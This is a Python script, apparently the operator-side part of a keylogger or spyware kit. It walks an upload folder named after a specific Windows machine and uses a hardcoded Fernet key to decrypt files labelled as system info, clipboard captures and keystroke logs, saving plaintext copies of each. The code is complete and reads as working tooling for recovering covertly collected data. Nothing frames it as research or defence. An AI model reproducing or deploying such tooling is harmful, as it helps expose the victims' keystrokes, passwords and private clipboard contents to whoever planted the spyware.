from cryptography.fernet import Fernet
import os

key = "e9pEXagLCMvIiyeOqsSf456koc4nmlHNIk9P7b5_7RE="
upload_folder = 'C:/Users/Hiba/Desktop/Server/upload/DESKTOP-4IH3VOH'
file_suffixes = ["e_systeminfo_", "e_clipboard_", "e_key_log_"]

fernet = Fernet(key)

for root, dirs, files in os.walk(upload_folder):
    for file_name in files:
        if any(file_name.startswith(suffix) for suffix in file_suffixes):
            file_path = os.path.join(root, file_name)
            print(f"Attempting to decrypt file: {file_path}")

            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                    print(f"Read {len(data)} bytes from {file_name}")

                decrypted = fernet.decrypt(data)
                print(f"Successfully decrypted: {file_path}")

                # Save the decrypted content with a new name or extension
                decrypted_file_path = file_path.replace("e_", "d_")
                with open(decrypted_file_path, 'wb') as f:
                    f.write(decrypted)

            except Exception as e:
                print(f"Decryption error for {file_name}: {e}")
                print(f"File path: {file_path}")
                print(f"File size: {os.path.getsize(file_path)} bytes")


